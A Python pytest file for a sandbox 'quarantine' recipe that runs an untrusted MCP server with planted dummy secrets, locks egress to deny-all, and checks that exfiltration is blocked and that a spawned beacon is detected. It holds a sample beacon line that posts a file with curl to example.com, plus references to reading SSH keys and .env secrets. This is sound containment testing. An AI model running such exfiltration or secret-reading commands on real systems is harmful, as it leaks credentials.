from pathlib import Path
from types import SimpleNamespace

import quarantine
from quarantine import beacon_lines, probe_blocked, read_observed, run, verdict
from tests.fakes import CLEAN_PS, OBSERVED_OK, FakeClient, FakeSandbox, _result

RECIPE_DIR = Path(__file__).resolve().parent.parent


def go(sandbox, **kw):
    """Runs the recipe against a fake sandbox, reading the real server/harness files from the recipe folder."""
    lines = []
    code = run(FakeClient(sandbox), RECIPE_DIR, log=kw.get("log", lines.append))
    return code, lines


def test_missing_env_names_every_missing_variable():
    assert quarantine.missing_env({"NEEV_API_KEY": "k"}) == ["NEEV_ORG_ID", "NEEV_PROJECT_ID"]


def test_model_key_is_not_required():
    assert "NEEV_MODEL_API_KEY" not in quarantine.REQUIRED_ENV


def test_main_exits_2_with_message_when_env_missing(monkeypatch, capsys):
    for name in quarantine.REQUIRED_ENV:
        monkeypatch.delenv(name, raising=False)
    assert quarantine.main([]) == 2
    assert "NEEV_API_KEY" in capsys.readouterr().err


def test_happy_path_contains_the_server_and_detects_every_move():
    sandbox = FakeSandbox()
    code, lines = go(sandbox)
    assert code == 0 and sandbox.deleted
    text = "\n".join(lines)
    assert "[PASS] exfiltration was blocked" in text
    assert "[PASS] the server's secret reads were seen" in text
    assert "[PASS] the background process the server spawned was detected" in text
    assert "quarantine held" in text


def test_create_uses_pypi_allow_list_and_the_prefix():
    sandbox = FakeSandbox()
    client = FakeClient(sandbox)
    run(client, RECIPE_DIR, log=lambda *_: None)
    params, allow_egress = client.created[0]
    assert allow_egress == quarantine.PYPI_HOSTS
    assert params["name"].startswith(quarantine.PREFIX)


def test_egress_is_locked_to_deny_all_after_install_and_before_the_server_runs():
    sandbox = FakeSandbox()
    go(sandbox)
    kinds = [(kind, detail) for kind, detail in sandbox.calls]
    install = next(i for i, (k, d) in enumerate(kinds) if k == "exec" and "-m pip install" in d)
    lockdown = next(i for i, (k, d) in enumerate(kinds) if k == "update")
    harness = next(i for i, (k, d) in enumerate(kinds) if k == "exec" and "harness.py" in d)
    assert install < lockdown < harness
    assert sandbox.calls[lockdown][1] == {"egress": {"mode": "deny_all"}}


def test_dummy_secrets_are_planted_and_the_code_is_uploaded():
    sandbox = FakeSandbox()
    go(sandbox)
    assert ".env" in sandbox.written and "NOT real credentials" in sandbox.written[".env"]
    assert "untrusted_server.py" in sandbox.written and "harness.py" in sandbox.written
    assert any("cat > /root/.ssh/id_rsa" in d for k, d in sandbox.calls if k == "exec")


def test_pip_install_failure_returns_1_and_still_deletes():
    sandbox = FakeSandbox(pip_exit=1)
    code, lines = go(sandbox)
    assert code == 1 and sandbox.deleted
    assert any("installing mcp exited 1" in line for line in lines)


def test_harness_error_returns_1_and_still_deletes():
    sandbox = FakeSandbox(harness_stdout='{"ok": false, "error": "ConnectionError: broken pipe"}')
    code, lines = go(sandbox)
    assert code == 1 and sandbox.deleted
    assert any("could not exercise the server" in line and "ConnectionError" in line for line in lines)


def test_unparsable_harness_output_returns_1_and_still_deletes():
    sandbox = FakeSandbox(harness_stdout="Traceback: boom")
    code, lines = go(sandbox)
    assert code == 1 and sandbox.deleted
    assert any("printed no result" in line for line in lines)


def test_exfiltration_to_the_outside_host_not_blocked_fails_the_run_but_still_deletes():
    sandbox = FakeSandbox(probe=_result(0, "227 200"))  # the upload went through: the boundary failed
    code, lines = go(sandbox)
    assert code == 1 and sandbox.deleted
    assert any("[FAIL] exfiltration was NOT fully blocked" in line for line in lines)


def test_previously_allowed_host_still_reachable_fails_the_run():
    # deny_all did not take hold: the package index, reachable at create time, still answers.
    sandbox = FakeSandbox(pypi_probe=_result(0, "20 200"))
    code, lines = go(sandbox)
    assert code == 1 and sandbox.deleted
    assert any("[FAIL] exfiltration was NOT fully blocked" in line for line in lines)


def test_server_reporting_a_successful_exfil_fails_the_run():
    # Both probes block, but the server's own send got through before lockdown: the run must fail.
    leaked = {**OBSERVED_OK, "exfil": {"url": quarantine.EXFIL_URL, "blocked": False, "error": None}}
    sandbox = FakeSandbox(observed=leaked)
    code, lines = go(sandbox)
    assert code == 1 and sandbox.deleted
    assert any("[FAIL] exfiltration was NOT fully blocked" in line for line in lines)


def test_no_spawned_process_fails_the_run():
    sandbox = FakeSandbox(ps_stdout=CLEAN_PS, observed=_observed_without_beacon())
    code, lines = go(sandbox)
    assert code == 1
    assert any("[FAIL] no spawned background process" in line for line in lines)


def test_missing_server_record_means_no_read_reported():
    # The sandbox cannot see in-process reads; with no server record, the read is honestly not reported.
    sandbox = FakeSandbox(observed=None)
    code, lines = go(sandbox)
    assert code == 1
    assert any("[FAIL] no secret read was reported" in line for line in lines)


def test_sandbox_that_never_becomes_ready_is_still_deleted():
    sandbox = FakeSandbox(ready_error=RuntimeError("did not become Ready"))
    code, lines = go(sandbox)
    assert code == 1 and sandbox.deleted
    assert sandbox.written == {}


def test_keyboard_interrupt_during_the_run_deletes_and_returns_130():
    sandbox = FakeSandbox(raise_on={"harness.py": KeyboardInterrupt()})
    code, _ = go(sandbox)
    assert code == 130 and sandbox.deleted


def test_create_failure_is_one_line_and_there_is_nothing_to_delete():
    def create(_params, allow_egress=None):
        raise RuntimeError("Error code: 401 - invalid api key")

    client = SimpleNamespace(sandboxes=SimpleNamespace(create=create))
    lines = []
    assert run(client, RECIPE_DIR, log=lines.append) == 1
    assert any("401" in line for line in lines)


def test_runs_get_different_sandbox_names():
    names = []
    for _ in range(2):
        client = FakeClient(FakeSandbox())
        run(client, RECIPE_DIR, log=lambda *_: None)
        names.append(client.created[0][0]["name"])
    assert names[0] != names[1] and all(n.startswith(quarantine.PREFIX) for n in names)


def test_probe_blocked_requires_no_bytes_sent_and_no_response():
    assert probe_blocked(_result(28, "0 000")) is True
    assert probe_blocked(_result(0, "227 200")) is False   # upload went through
    assert probe_blocked(_result(28, "227 000")) is False  # bytes left, reply was slow
    assert probe_blocked(_result(28, "")) is False         # unreadable: assume sent


def test_beacon_lines_finds_only_the_marked_process():
    stdout = ("  1 /sbin/init\n"
              f"  2 sh -c : {quarantine.BEACON_MARKER}; curl -eo-ish --data-binary @x https://example.com\n"
              "  3 python3 harness.py\n")
    found = beacon_lines(stdout)
    assert len(found) == 1 and quarantine.BEACON_MARKER in found[0]  # a marked line keeping odd flags is not dropped


def test_read_observed_returns_none_when_absent():
    assert read_observed(FakeSandbox(observed=None)) is None


def test_verdict_formats_pass_and_fail():
    assert verdict(True, "good", "bad") == "   [PASS] good"
    assert verdict(False, "good", "bad") == "   [FAIL] bad"


def _observed_without_beacon():
    """An observed record with reads but no running beacon, for the no-spawn case."""
    return {"read": [{"path": quarantine.SECRET_FILES[0], "bytes": 227}],
            "exfil": {"url": quarantine.EXFIL_URL, "blocked": True, "error": "URLError: timed out"}}
